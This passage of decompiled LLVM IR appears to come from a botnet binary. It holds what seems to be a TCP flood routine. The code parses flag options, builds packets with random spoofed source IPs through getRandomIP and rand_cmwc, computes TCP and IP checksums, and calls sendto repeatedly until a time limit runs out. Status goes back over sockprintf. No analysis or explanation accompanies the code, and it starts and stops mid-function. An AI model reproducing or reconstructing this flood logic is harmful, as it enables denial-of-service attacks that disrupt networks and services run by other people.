  %v2_804bdcf = or i8 %v3_804bdcb, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bdcf = zext i8 %v2_804bdcf to i32
  store i32 %v7_804bdcf, i32* %eax.global-to-local, align 4
  store i8 %v2_804bdcf, i8* %v2_804bdb3, align 1
  store i32 %v1_804bd07, i32* %edx.global-to-local, align 4
  %v3_804bdd7 = load i8, i8* %v2_804bdb3, align 1
  %v2_804bddb = or i8 %v3_804bdd7, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bddb = zext i8 %v2_804bddb to i32
  store i32 %v7_804bddb, i32* %eax.global-to-local, align 4
  store i8 %v2_804bddb, i8* %v2_804bdb3, align 1
  store i32 %v1_804bd07, i32* %edx.global-to-local, align 4
  %v3_804bde3 = load i8, i8* %v2_804bdb3, align 1
  %v2_804bde7 = or i8 %v3_804bde3, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bde7 = zext i8 %v2_804bde7 to i32
  store i32 %v7_804bde7, i32* %eax.global-to-local, align 4
  store i8 %v2_804bde7, i8* %v2_804bdb3, align 1
  %v0_804bfc7.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804bfc7

dec_label_pc_804bdf1:                             ; preds = %dec_label_pc_804bcc8
  store i32 %v4_804bd7d, i32* @eax, align 4
  %v0_804bdf4 = load i32, i32* @esp, align 4
  %v1_804bdf4 = add i32 %v0_804bdf4, 4
  %v2_804bdf4 = inttoptr i32 %v1_804bdf4 to i32*
  store i32 ptrtoint (i32* @global_var_8052eb4.47 to i32), i32* %v2_804bdf4, align 4
  %v0_804bdfc = load i32, i32* @eax, align 4
  %v1_804bdfc = load i32, i32* @esp, align 4
  %v2_804bdfc = inttoptr i32 %v1_804bdfc to i32*
  store i32 %v0_804bdfc, i32* %v2_804bdfc, align 4
  %v3_804bdff = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8052eb0.46 to i32))
  store i32 %v3_804bdff, i32* %eax.global-to-local, align 4
  %v5_804be04 = inttoptr i32 %v3_804bdff to i8*
  store i8* %v5_804be04, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bfbd18 = icmp eq i32 %v3_804bdff, 0
  %v1_804bfc125 = icmp eq i1 %v5_804bfbd18, false
  br i1 %v1_804bfc125, label %dec_label_pc_804be0c.lr.ph, label %dec_label_pc_804bfc7

dec_label_pc_804be0c.lr.ph:                       ; preds = %dec_label_pc_804bdf1
  %v1_804bf7d = add i32 %v2_804bcef, 33
  %v2_804bf7d = inttoptr i32 %v1_804bf7d to i8*
  %tmp92 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804be0c

dec_label_pc_804be0c:                             ; preds = %dec_label_pc_804be0c.lr.ph, %dec_label_pc_804bfa6
  %v3_804bf8f = phi i8* [ %v5_804be04, %dec_label_pc_804be0c.lr.ph ], [ %tmp93, %dec_label_pc_804bfa6 ]
  %stack_var_-160.127 = phi i32 [ %tmp41, %dec_label_pc_804be0c.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804bfa6 ]
  %stack_var_-156.126 = phi i8* [ %tmp42, %dec_label_pc_804be0c.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804bfa6 ]
  %v4_804be0c = ptrtoint i8* %v3_804bf8f to i32
  store i32 %v4_804be0c, i32* %eax.global-to-local, align 4
  store i32 %v4_804be0c, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8052eb6.48 to i32), i32* @edi, align 4
  %v7_804be2a = call i32 @_strncmp(i8* %v3_804bf8f, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052eb6.48, i32 0, i32 0), i32 4)
  %v8_804be2a = urem i32 %v7_804be2a, 2
  %v9_804be2a = icmp eq i32 %v8_804be2a, 0
  %v0_804be2c = load i1, i1* %cf.global-to-local, align 1
  %v2_804be2c = or i1 %v0_804be2c, %v9_804be2a
  %v3_804be2c = zext i1 %v2_804be2c to i32
  %v4_804be2c = load i32, i32* @edx, align 4
  %v5_804be2c = and i32 %v4_804be2c, -256
  %v6_804be2c = or i32 %v3_804be2c, %v5_804be2c
  %v7_804be2c = xor i32 %v6_804be2c, 1
  store i32 %v7_804be2c, i32* %edx.global-to-local, align 4
  %v3_804be32 = and i32 %v7_804be2a, -256
  %v1_804be34 = trunc i32 %v7_804be2c to i8
  %v3_804be34 = zext i1 %v0_804be2c to i8
  %v4_804be34 = sub nsw i8 %v1_804be34, %v3_804be34
  %v15_804be34 = icmp eq i8 %v4_804be34, 0
  %v20_804be34 = zext i8 %v4_804be34 to i32
  %v23_804be34 = or i32 %v20_804be34, %v3_804be32
  store i32 %v23_804be34, i32* @ecx, align 4
  %v2_804be38 = sext i8 %v4_804be34 to i32
  store i32 %v2_804be38, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be3d = icmp eq i1 %v15_804be34, false
  br i1 %v1_804be3d, label %dec_label_pc_804be51, label %dec_label_pc_804be3f

dec_label_pc_804be3f:                             ; preds = %dec_label_pc_804be0c
  store i32 %v1_804bd07, i32* @eax, align 4
  %v3_804be42 = load i8, i8* %v2_804bf7d, align 1
  %v2_804be46 = or i8 %v3_804be42, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be46 = zext i8 %v2_804be46 to i32
  store i32 %v7_804be46, i32* @edx, align 4
  store i8 %v2_804be46, i8* %v2_804bf7d, align 1
  br label %dec_label_pc_804bfa6

dec_label_pc_804be51:                             ; preds = %dec_label_pc_804be0c
  store i32 %v4_804be0c, i32* %eax.global-to-local, align 4
  store i32 %v4_804be0c, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8052eba.49 to i32), i32* @edi, align 4
  %v7_804be6f = call i32 @_strncmp(i8* %v3_804bf8f, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052eba.49, i32 0, i32 0), i32 4)
  %v8_804be6f = urem i32 %v7_804be6f, 2
  %v9_804be6f = icmp eq i32 %v8_804be6f, 0
  %v0_804be71 = load i1, i1* %cf.global-to-local, align 1
  %v2_804be71 = or i1 %v0_804be71, %v9_804be6f
  %v3_804be71 = zext i1 %v2_804be71 to i32
  %v4_804be71 = load i32, i32* %edx.global-to-local, align 4
  %v5_804be71 = and i32 %v4_804be71, -256
  %v6_804be71 = or i32 %v3_804be71, %v5_804be71
  %v7_804be71 = xor i32 %v6_804be71, 1
  store i32 %v7_804be71, i32* %edx.global-to-local, align 4
  %v3_804be77 = and i32 %v7_804be6f, -256
  %v1_804be79 = trunc i32 %v7_804be71 to i8
  %v3_804be79 = zext i1 %v0_804be71 to i8
  %v4_804be79 = sub nsw i8 %v1_804be79, %v3_804be79
  %v15_804be79 = icmp eq i8 %v4_804be79, 0
  %v20_804be79 = zext i8 %v4_804be79 to i32
  %v23_804be79 = or i32 %v20_804be79, %v3_804be77
  store i32 %v23_804be79, i32* @ecx, align 4
  %v2_804be7d = sext i8 %v4_804be79 to i32
  store i32 %v2_804be7d, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804be82 = icmp eq i1 %v15_804be79, false
  br i1 %v1_804be82, label %dec_label_pc_804be96, label %dec_label_pc_804be84

dec_label_pc_804be84:                             ; preds = %dec_label_pc_804be51
  store i32 %v1_804bd07, i32* @eax, align 4
  %v3_804be87 = load i8, i8* %v2_804bf7d, align 1
  %v2_804be8b = or i8 %v3_804be87, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804be8b = zext i8 %v2_804be8b to i32
  store i32 %v7_804be8b, i32* @edx, align 4
  store i8 %v2_804be8b, i8* %v2_804bf7d, align 1
  br label %dec_label_pc_804bfa6

dec_label_pc_804be96:                             ; preds = %dec_label_pc_804be51
  store i32 %v4_804be0c, i32* %eax.global-to-local, align 4
  store i32 %v4_804be0c, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8052ebe.50 to i32), i32* @edi, align 4
  %v7_804beba = call i32 @_strncmp(i8* %v3_804bf8f, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052ebe.50, i32 0, i32 0), i32 4)
  %v8_804beba = urem i32 %v7_804beba, 2
  %v9_804beba = icmp eq i32 %v8_804beba, 0
  %v0_804bebc = load i1, i1* %cf.global-to-local, align 1
  %v2_804bebc = or i1 %v0_804bebc, %v9_804beba
  %v3_804bebc = zext i1 %v2_804bebc to i32
  %v4_804bebc = load i32, i32* %edx.global-to-local, align 4
  %v5_804bebc = and i32 %v4_804bebc, -256
  %v6_804bebc = or i32 %v3_804bebc, %v5_804bebc
  %v7_804bebc = xor i32 %v6_804bebc, 1
  store i32 %v7_804bebc, i32* %edx.global-to-local, align 4
  %v3_804bec2 = and i32 %v7_804beba, -256
  %v1_804bec4 = trunc i32 %v7_804bebc to i8
  %v3_804bec4 = zext i1 %v0_804bebc to i8
  %v4_804bec4 = sub nsw i8 %v1_804bec4, %v3_804bec4
  %v15_804bec4 = icmp eq i8 %v4_804bec4, 0
  %v20_804bec4 = zext i8 %v4_804bec4 to i32
  %v23_804bec4 = or i32 %v20_804bec4, %v3_804bec2
  store i32 %v23_804bec4, i32* @ecx, align 4
  %v2_804bec8 = sext i8 %v4_804bec4 to i32
  store i32 %v2_804bec8, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804becd = icmp eq i1 %v15_804bec4, false
  br i1 %v1_804becd, label %dec_label_pc_804bee1, label %dec_label_pc_804becf

dec_label_pc_804becf:                             ; preds = %dec_label_pc_804be96
  store i32 %v1_804bd07, i32* @eax, align 4
  %v3_804bed2 = load i8, i8* %v2_804bf7d, align 1
  %v2_804bed6 = or i8 %v3_804bed2, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bed6 = zext i8 %v2_804bed6 to i32
  store i32 %v7_804bed6, i32* @edx, align 4
  store i8 %v2_804bed6, i8* %v2_804bf7d, align 1
  br label %dec_label_pc_804bfa6

dec_label_pc_804bee1:                             ; preds = %dec_label_pc_804be96
  store i32 %v4_804be0c, i32* %eax.global-to-local, align 4
  store i32 %v4_804be0c, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8052ec2.51 to i32), i32* @edi, align 4
  %v7_804bf11 = call i32 @_strncmp(i8* %v3_804bf8f, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052ec2.51, i32 0, i32 0), i32 4)
  %v8_804bf11 = urem i32 %v7_804bf11, 2
  %v9_804bf11 = icmp eq i32 %v8_804bf11, 0
  %v0_804bf13 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf13 = or i1 %v0_804bf13, %v9_804bf11
  %v3_804bf13 = zext i1 %v2_804bf13 to i32
  %v4_804bf13 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf13 = and i32 %v4_804bf13, -256
  %v6_804bf13 = or i32 %v3_804bf13, %v5_804bf13
  %v7_804bf13 = xor i32 %v6_804bf13, 1
  store i32 %v7_804bf13, i32* %edx.global-to-local, align 4
  %v3_804bf19 = and i32 %v7_804bf11, -256
  %v1_804bf1b = trunc i32 %v7_804bf13 to i8
  %v3_804bf1b = zext i1 %v0_804bf13 to i8
  %v4_804bf1b = sub nsw i8 %v1_804bf1b, %v3_804bf1b
  %v15_804bf1b = icmp eq i8 %v4_804bf1b, 0
  %v20_804bf1b = zext i8 %v4_804bf1b to i32
  %v23_804bf1b = or i32 %v20_804bf1b, %v3_804bf19
  store i32 %v23_804bf1b, i32* @ecx, align 4
  %v2_804bf1f = sext i8 %v4_804bf1b to i32
  store i32 %v2_804bf1f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf24 = icmp eq i1 %v15_804bf1b, false
  br i1 %v1_804bf24, label %dec_label_pc_804bf35, label %dec_label_pc_804bf26

dec_label_pc_804bf26:                             ; preds = %dec_label_pc_804bee1
  store i32 %v1_804bd07, i32* @eax, align 4
  %v3_804bf29 = load i8, i8* %v2_804bf7d, align 1
  %v2_804bf2d = or i8 %v3_804bf29, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bf2d = zext i8 %v2_804bf2d to i32
  store i32 %v7_804bf2d, i32* @edx, align 4
  store i8 %v2_804bf2d, i8* %v2_804bf7d, align 1
  br label %dec_label_pc_804bfa6

dec_label_pc_804bf35:                             ; preds = %dec_label_pc_804bee1
  store i32 %v4_804be0c, i32* %eax.global-to-local, align 4
  store i32 %v4_804be0c, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8052ec6.52 to i32), i32* @edi, align 4
  %v7_804bf65 = call i32 @_strncmp(i8* %v3_804bf8f, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052ec6.52, i32 0, i32 0), i32 4)
  %v8_804bf65 = urem i32 %v7_804bf65, 2
  %v9_804bf65 = icmp eq i32 %v8_804bf65, 0
  %v0_804bf67 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bf67 = or i1 %v0_804bf67, %v9_804bf65
  %v3_804bf67 = zext i1 %v2_804bf67 to i32
  %v4_804bf67 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bf67 = and i32 %v4_804bf67, -256
  %v6_804bf67 = or i32 %v3_804bf67, %v5_804bf67
  %v7_804bf67 = xor i32 %v6_804bf67, 1
  store i32 %v7_804bf67, i32* %edx.global-to-local, align 4
  %v3_804bf6d = and i32 %v7_804bf65, -256
  %v1_804bf6f = trunc i32 %v7_804bf67 to i8
  %v3_804bf6f = zext i1 %v0_804bf67 to i8
  %v4_804bf6f = sub nsw i8 %v1_804bf6f, %v3_804bf6f
  %v15_804bf6f = icmp eq i8 %v4_804bf6f, 0
  %v20_804bf6f = zext i8 %v4_804bf6f to i32
  %v23_804bf6f = or i32 %v20_804bf6f, %v3_804bf6d
  store i32 %v23_804bf6f, i32* @ecx, align 4
  %v2_804bf73 = sext i8 %v4_804bf6f to i32
  store i32 %v2_804bf73, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bf78 = icmp eq i1 %v15_804bf6f, false
  br i1 %v1_804bf78, label %dec_label_pc_804bf89, label %dec_label_pc_804bf7a

dec_label_pc_804bf7a:                             ; preds = %dec_label_pc_804bf35
  store i32 %v1_804bd07, i32* @eax, align 4
  %v3_804bf7d = load i8, i8* %v2_804bf7d, align 1
  %v2_804bf81 = or i8 %v3_804bf7d, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804bf81 = zext i8 %v2_804bf81 to i32
  store i32 %v7_804bf81, i32* @edx, align 4
  store i8 %v2_804bf81, i8* %v2_804bf7d, align 1
  br label %dec_label_pc_804bfa6

dec_label_pc_804bf89:                             ; preds = %dec_label_pc_804bf35
  %v0_804bf89 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804bf89 = ptrtoint i8* %v0_804bf89 to i32
  store i32 %v1_804bf89, i32* %edx.global-to-local, align 4
  store i32 %v4_804be0c, i32* %eax.global-to-local, align 4
  %v1_804bf92 = load i32, i32* @esp, align 4
  %v2_804bf92 = add i32 %v1_804bf92, 8
  %v3_804bf92 = inttoptr i32 %v2_804bf92 to i32*
  store i32 %v4_804be0c, i32* %v3_804bf92, align 4
  %v0_804bf96 = load i32, i32* @esp, align 4
  %v1_804bf96 = add i32 %v0_804bf96, 4
  %v2_804bf96 = inttoptr i32 %v1_804bf96 to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_8052eca.53 to i32), i32* %v2_804bf96, align 4
  %v0_804bf9e = load i32, i32* %edx.global-to-local, align 4
  %v1_804bf9e = load i32, i32* @esp, align 4
  %v2_804bf9e = inttoptr i32 %v1_804bf9e to i32*
  store i32 %v0_804bf9e, i32* %v2_804bf9e, align 4
  %v3_804bfa1 = call i32 @sockprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8052ec6.52 to i32))
  store i32 %v3_804bfa1, i32* @eax, align 4
  br label %dec_label_pc_804bfa6

dec_label_pc_804bfa6:                             ; preds = %dec_label_pc_804bf7a, %dec_label_pc_804bf26, %dec_label_pc_804becf, %dec_label_pc_804be84, %dec_label_pc_804be3f, %dec_label_pc_804bf89
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052ec6.52, i32 0, i32 0), %dec_label_pc_804bf89 ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8052ec6.52, i32 0, i32 0), %dec_label_pc_804bf7a ], [ %stack_var_-156.126, %dec_label_pc_804bf26 ], [ %stack_var_-156.126, %dec_label_pc_804becf ], [ %stack_var_-156.126, %dec_label_pc_804be84 ], [ %stack_var_-156.126, %dec_label_pc_804be3f ]
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804bf89 ], [ 4, %dec_label_pc_804bf7a ], [ %stack_var_-160.127, %dec_label_pc_804bf26 ], [ %stack_var_-160.127, %dec_label_pc_804becf ], [ %stack_var_-160.127, %dec_label_pc_804be84 ], [ %stack_var_-160.127, %dec_label_pc_804be3f ]
  %v0_804bfa6 = load i32, i32* @esp, align 4
  %v1_804bfa6 = add i32 %v0_804bfa6, 4
  %v2_804bfa6 = inttoptr i32 %v1_804bfa6 to i32*
  store i32 ptrtoint (i32* @global_var_8052eb4.47 to i32), i32* %v2_804bfa6, align 4
  %v0_804bfae = load i32, i32* @esp, align 4
  %v1_804bfae = inttoptr i32 %v0_804bfae to i32*
  store i32 0, i32* %v1_804bfae, align 4
  %v2_804bfb5 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804bfb5 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804bfb5)
  store i32 %v3_804bfb5, i32* %eax.global-to-local, align 4
  store i32 %v3_804bfb5, i32* %tmp92, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bfbd = icmp eq i32 %v3_804bfb5, 0
  %v1_804bfc1 = icmp eq i1 %v5_804bfbd, false
  %tmp93 = inttoptr i32 %v3_804bfb5 to i8*
  br i1 %v1_804bfc1, label %dec_label_pc_804be0c, label %dec_label_pc_804bfc7

dec_label_pc_804bfc7:                             ; preds = %dec_label_pc_804bfa6, %dec_label_pc_804bdf1, %dec_label_pc_804bdb0
  %v0_804bfc7 = phi i8* [ %v0_804bfc7.pre, %dec_label_pc_804bdb0 ], [ %v5_804be04, %dec_label_pc_804bdf1 ], [ %tmp93, %dec_label_pc_804bfa6 ]
  %v1_804bfc7 = ptrtoint i8* %v0_804bfc7 to i32
  %v2_804bfc7 = call i32 @rand_cmwc(i32 %v1_804bfc7)
  %v1_804bfcc = urem i32 %v2_804bfc7, 65536
  store i32 %v1_804bfcc, i32* %edx.global-to-local, align 4
  %v1_804bfd2 = trunc i32 %v2_804bfc7 to i16
  %v3_804bfd2 = add i32 %v2_804bcef, 34
  %v4_804bfd2 = inttoptr i32 %v3_804bfd2 to i16*
  store i16 %v1_804bfd2, i16* %v4_804bfd2, align 2
  %v1_804bfd9 = add i32 %v2_804bcef, 36
  %v2_804bfd9 = inttoptr i32 %v1_804bfd9 to i16*
  store i16 0, i16* %v2_804bfd9, align 4
  store i32 %v1_804bd07, i32* %eax.global-to-local, align 4
  %v1_804bfe2 = add i32 %v2_804bcef, 38
  %v2_804bfe2 = inttoptr i32 %v1_804bfe2 to i16*
  store i16 0, i16* %v2_804bfe2, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804bbe9, label %dec_label_pc_804bffb, label %dec_label_pc_804bfee

dec_label_pc_804bfee:                             ; preds = %dec_label_pc_804bfc7
  %v0_804bfee = load i8*, i8** %stack_var_-20, align 4
  %v1_804bfee = ptrtoint i8* %v0_804bfee to i32
  %v2_804bfee = call i32 @rand_cmwc(i32 %v1_804bfee)
  br label %dec_label_pc_804c00f

dec_label_pc_804bffb:                             ; preds = %dec_label_pc_804bfc7
  %v1_804bffe = urem i32 %arg2, 65536
  store i32 %v1_804bffe, i32* %eax.global-to-local, align 4
  %v1_804c001 = load i32, i32* @esp, align 4
  %v2_804c001 = inttoptr i32 %v1_804c001 to i32*
  store i32 %v1_804bffe, i32* %v2_804c001, align 4
  %v3_804c004 = call i32 @htons(i16 %tmp40)
  br label %dec_label_pc_804c00f

dec_label_pc_804c00f:                             ; preds = %dec_label_pc_804bfee, %dec_label_pc_804bffb
  %storemerge13.in = phi i32 [ %v2_804bfee, %dec_label_pc_804bfee ], [ %v3_804c004, %dec_label_pc_804bffb ]
  %storemerge = trunc i32 %storemerge13.in to i16
  %sext = mul i32 %storemerge13.in, 65536
  %v4_804c012 = sdiv i32 %sext, 65536
  store i32 %v4_804c012, i32* @esi, align 4
  %v3_804c015 = add i32 %v2_804bcef, 22
  %v4_804c015 = inttoptr i32 %v3_804c015 to i16*
  store i16 %storemerge, i16* %v4_804c015, align 2
  %v1_804c01c = load i32, i32* @esp, align 4
  %v2_804c01c = add i32 %v1_804c01c, 4
  %v3_804c01c = inttoptr i32 %v2_804c01c to i32*
  store i32 %v1_804bd07, i32* %v3_804c01c, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  %v1_804c023 = load i32, i32* @esp, align 4
  %v2_804c023 = inttoptr i32 %v1_804c023 to i32*
  store i32 %v2_804bcef, i32* %v2_804c023, align 4
  %v0_804c026 = call i32 @tcpcsum()
  %v1_804c02b = urem i32 %v0_804c026, 65536
  store i32 %v1_804c02b, i32* %edx.global-to-local, align 4
  %v1_804c031 = trunc i32 %v0_804c026 to i16
  store i16 %v1_804c031, i16* %v2_804bfd9, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  %v1_804c038 = or i32 %v2_804bcef, 2
  %v2_804c038 = inttoptr i32 %v1_804c038 to i16*
  %v3_804c038 = load i16, i16* %v2_804c038, align 2
  %v4_804c038 = zext i16 %v3_804c038 to i32
  store i32 %v4_804c038, i32* %edx.global-to-local, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  %v1_804c041 = load i32, i32* @esp, align 4
  %v2_804c041 = add i32 %v1_804c041, 4
  %v3_804c041 = inttoptr i32 %v2_804c041 to i32*
  store i32 %v4_804c038, i32* %v3_804c041, align 4
  %v0_804c045 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c045 = load i32, i32* @esp, align 4
  %v2_804c045 = inttoptr i32 %v1_804c045 to i32*
  store i32 %v0_804c045, i32* %v2_804c045, align 4
  %v3_804c048 = inttoptr i32 %v4_804c012 to i16*
  %v4_804c048 = call i32 @csum(i16* %v3_804c048, i32 %v15_804bbce)
  %v1_804c04d = urem i32 %v4_804c048, 65536
  store i32 %v1_804c04d, i32* %edx.global-to-local, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  %v1_804c053 = trunc i32 %v4_804c048 to i16
  %v3_804c053 = or i32 %v2_804bcef, 10
  %v4_804c053 = inttoptr i32 %v3_804c053 to i16*
  store i16 %v1_804c053, i16* %v4_804c053, align 2
  %v0_804c057 = load i32, i32* @esp, align 4
  %v1_804c057 = inttoptr i32 %v0_804c057 to i32*
  store i32 0, i32* %v1_804c057, align 4
  %v2_804c05e = inttoptr i32 %v4_804c012 to i32*
  %v3_804c05e = call i32 @__GI_time(i32* %v2_804c05e)
  %v5_804c063 = add i32 %v3_804c05e, %arg3
  %v10_804c063 = icmp ult i32 %v5_804c063, %v3_804c05e
  store i1 %v10_804c063, i1* %cf.global-to-local, align 1
  store i32 %v5_804c063, i32* %eax.global-to-local, align 4
  %v2_804c0ba = or i32 %v2_804bcef, 12
  %v3_804c0ba = inttoptr i32 %v2_804c0ba to i32*
  %v3_804c0c8 = or i32 %v2_804bcef, 4
  %v4_804c0c8 = inttoptr i32 %v3_804c0c8 to i16*
  br label %dec_label_pc_804c072

dec_label_pc_804c072:                             ; preds = %dec_label_pc_804c136, %dec_label_pc_804c153, %dec_label_pc_804c00f
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804c00f ], [ %v4_804c153, %dec_label_pc_804c153 ], [ 0, %dec_label_pc_804c136 ]
  store i32 %v2_804bcef, i32* %edx.global-to-local, align 4
  %v0_804c078 = load i32, i32* @esp, align 4
  %v1_804c078 = add i32 %v0_804c078, 20
  %v2_804c078 = inttoptr i32 %v1_804c078 to i32*
  store i32 16, i32* %v2_804c078, align 4
  %v1_804c080 = load i32, i32* @esp, align 4
  %v2_804c080 = add i32 %v1_804c080, 16
  %v3_804c080 = inttoptr i32 %v2_804c080 to i32*
  store i32 %v2_804bc0e, i32* %v3_804c080, align 4
  %v0_804c084 = load i32, i32* @esp, align 4
  %v1_804c084 = add i32 %v0_804c084, 12
  %v2_804c084 = inttoptr i32 %v1_804c084 to i32*
  store i32 0, i32* %v2_804c084, align 4
  store i32 %v1_804bccb, i32* @edi, align 4
  %v1_804c08f = load i32, i32* @esp, align 4
  %v2_804c08f = add i32 %v1_804c08f, 8
  %v3_804c08f = inttoptr i32 %v2_804c08f to i32*
  store i32 %v1_804bccb, i32* %v3_804c08f, align 4
  %v0_804c093 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c093 = load i32, i32* @esp, align 4
  %v2_804c093 = add i32 %v1_804c093, 4
  %v3_804c093 = inttoptr i32 %v2_804c093 to i32*
  store i32 %v0_804c093, i32* %v3_804c093, align 4
  store i32 %v3_804bc56, i32* %eax.global-to-local, align 4
  %v1_804c09a = load i32, i32* @esp, align 4
  %v2_804c09a = inttoptr i32 %v1_804c09a to i32*
  store i32 %v3_804bc56, i32* %v2_804c09a, align 4
  %v1_804c09d = load i32, i32* %stack_var_-64, align 4
  %v2_804c09d = load i32, i32* %stack_var_-60, align 4
  %v3_804c09d = load i32, i32* %stack_var_-56, align 4
  %v4_804c09d = load i32, i32* %stack_var_-52, align 4
  %v6_804c09d = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804c09d, i32 %v2_804c09d, i32 %v3_804c09d, i32 %v4_804c09d, i32 0)
  store i32 %storemerge11, i32* %eax.global-to-local, align 4
  %v1_804c0a5 = load i32, i32* @esp, align 4
  %v2_804c0a5 = inttoptr i32 %v1_804c0a5 to i32*
  store i32 %storemerge11, i32* %v2_804c0a5, align 4
  %v1_804c0a8 = load i32, i32* %stack_var_-64, align 4
  %v2_804c0a8 = call i32 @getRandomIP(i32 %stack_var_-68.0, i32 %v1_804c0a8)
  store i32 %v2_804c0a8, i32* %eax.global-to-local, align 4
  %v1_804c0ad = load i32, i32* @esp, align 4
  %v2_804c0ad = inttoptr i32 %v1_804c0ad to i32*
  store i32 %v2_804c0a8, i32* %v2_804c0ad, align 4
  %v0_804c0b0 = call i32 @htonl()
  store i32 %v0_804c0b0, i32* %edx.global-to-local, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  store i32 %v0_804c0b0, i32* %v3_804c0ba, align 4
  %v1_804c0bd = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804c0c2 = urem i32 %v1_804c0bd, 65536
  store i32 %v1_804c0c2, i32* %edx.global-to-local, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  %v1_804c0c8 = trunc i32 %v1_804c0bd to i16
  store i16 %v1_804c0c8, i16* %v4_804c0c8, align 4
  %v1_804c0cc = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804c0cc, i32* %edx.global-to-local, align 4
  store i32 %v1_804bd07, i32* %eax.global-to-local, align 4
  store i32 %v1_804c0cc, i32* %v3_804bd62, align 8
  %v1_804c0d9 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %v1_804c0de = urem i32 %v1_804c0d9, 65536
  store i32 %v1_804c0de, i32* %edx.global-to-local, align 4
  %v1_804c0e4 = trunc i32 %v1_804c0d9 to i16
  store i16 %v1_804c0e4, i16* %v5_804bd0a, align 4
  store i16 0, i16* %v2_804bfd9, align 4
  %v1_804c0f3 = load i32, i32* @esp, align 4
  %v2_804c0f3 = add i32 %v1_804c0f3, 4
  %v3_804c0f3 = inttoptr i32 %v2_804c0f3 to i32*
  store i32 %v1_804bd07, i32* %v3_804c0f3, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  %v1_804c0fa = load i32, i32* @esp, align 4
  %v2_804c0fa = inttoptr i32 %v1_804c0fa to i32*
  store i32 %v2_804bcef, i32* %v2_804c0fa, align 4
  %v0_804c0fd = call i32 @tcpcsum()
  %v1_804c102 = urem i32 %v0_804c0fd, 65536
  store i32 %v1_804c102, i32* %edx.global-to-local, align 4
  %v1_804c108 = trunc i32 %v0_804c0fd to i16
  store i16 %v1_804c108, i16* %v2_804bfd9, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  %v3_804c10f = load i16, i16* %v2_804c038, align 2
  %v4_804c10f = zext i16 %v3_804c10f to i32
  store i32 %v4_804c10f, i32* %edx.global-to-local, align 4
  store i32 %v2_804bcef, i32* %eax.global-to-local, align 4
  %v1_804c118 = load i32, i32* @esp, align 4
  %v2_804c118 = add i32 %v1_804c118, 4
  %v3_804c118 = inttoptr i32 %v2_804c118 to i32*
  store i32 %v4_804c10f, i32* %v3_804c118, align 4
  %v0_804c11c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c11c = load i32, i32* @esp, align 4
  %v2_804c11c = inttoptr i32 %v1_804c11c to i32*
  store i32 %v0_804c11c, i32* %v2_804c11c, align 4
  %v1_804c11f = load i32, i32* %stack_var_-64, align 4
  %v2_804c11f = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804c11f = call i32 @csum(i16* %v2_804c11f, i32 %v1_804c11f)
  %v1_804c124 = urem i32 %v3_804c11f, 65536
  store i32 %v1_804c124, i32* %edx.global-to-local, align 4
